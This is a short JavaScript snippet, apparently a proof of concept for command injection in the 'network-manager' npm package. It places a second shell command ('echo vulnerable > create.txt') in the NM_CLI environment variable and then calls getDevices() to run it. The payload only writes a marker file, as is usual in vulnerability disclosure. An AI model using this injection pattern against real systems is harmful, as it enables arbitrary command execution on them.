process.env.NM_CLI = 'echo vulnerable > create.txt & nmcli';
var root = require("network-manager");
root.getDevices();
